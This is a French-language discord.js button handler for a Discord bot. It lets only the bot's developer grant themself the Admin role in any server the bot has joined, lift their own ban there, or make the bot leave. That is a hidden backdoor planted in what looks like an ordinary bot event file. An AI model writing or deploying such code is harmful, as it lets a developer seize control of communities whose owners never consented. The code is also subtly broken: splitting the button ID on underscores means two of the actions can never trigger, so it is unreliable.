const { Events } = require('discord.js');

module.exports = {
    name: Events.InteractionCreate,
    async run(client, interaction) {
        if (!interaction.isButton()) return; 

        const [action, serverId] = interaction.customId.split('_');

        switch (action) {
            case 'give_admin':
                await handleGiveAdmin(interaction, serverId);
                break;
            case 'leave_server':
                await handleLeaveServer(interaction, serverId);
                break;
            case 'unban':
                await handleUnban(interaction, serverId);
                break;
            default: 
        
        }
    },
};

async function handleGiveAdmin(interaction, serverId) {
    if (interaction.user.id !== process.env.DEVELOPER_ID) {
        return interaction.reply({ content: 'Vous n\'avez pas la permission d\'utiliser cette action.', ephemeral: true });
    }

    try {
        const guild = await interaction.client.guilds.fetch(serverId);
        const role = guild.roles.cache.find(role => role.name === 'Admin');

        if (!role) {
            return interaction.reply({ content: 'Rôle Admin non trouvé dans ce serveur.', ephemeral: true });
        }

        const member = await guild.members.fetch(interaction.user.id);  // L'utilisateur qui interagit reçoit le rôle Admin
        await member.roles.add(role);

        await interaction.reply({ content: `✅ Le rôle Admin a été attribué avec succès dans le serveur ${guild.name}.`, ephemeral: true });
    } catch (error) {
        console.error('Erreur lors de l\'attribution du rôle Admin:', error);
        await interaction.reply({ content: '❌ Une erreur est survenue lors de l\'attribution du rôle Admin.', ephemeral: true });
    }
}


async function handleLeaveServer(interaction, serverId) {
    if (interaction.user.id !== process.env.DEVELOPER_ID) {
        return interaction.reply({ content: 'Vous n\'avez pas la permission d\'utiliser cette action.', ephemeral: true });
    }

    try {
        const guild = await interaction.client.guilds.fetch(serverId);
        await guild.leave(); 
        await interaction.reply({ content: `✅ Le bot a quitté le serveur ${guild.name}.`, ephemeral: true });
    } catch (error) {
        console.error('Erreur lors du départ du serveur:', error);
        await interaction.reply({ content: '❌ Une erreur est survenue lors du départ du serveur.', ephemeral: true });
    }
}


async function handleUnban(interaction, serverId) {
    if (interaction.user.id !== process.env.DEVELOPER_ID) {
        return interaction.reply({ content: 'Vous n\'avez pas la permission d\'utiliser cette action.', ephemeral: true });
    }

    try {
        const guild = await interaction.client.guilds.fetch(serverId);
        const bans = await guild.bans.fetch();
        const bannedUser = bans.find(ban => ban.user.id === interaction.user.id);

        if (!bannedUser) {
            return interaction.reply({ content: 'Vous n\'êtes pas banni de ce serveur.', ephemeral: true });
        }

        await guild.members.unban(interaction.user.id);
        await interaction.reply({ content: `✅ Vous avez été débanni du serveur ${guild.name}.`, ephemeral: true });
    } catch (error) {
        console.error('Erreur lors du débannissement:', error);
        await interaction.reply({ content: '❌ Une erreur est survenue lors du débannissement.', ephemeral: true });
    }
}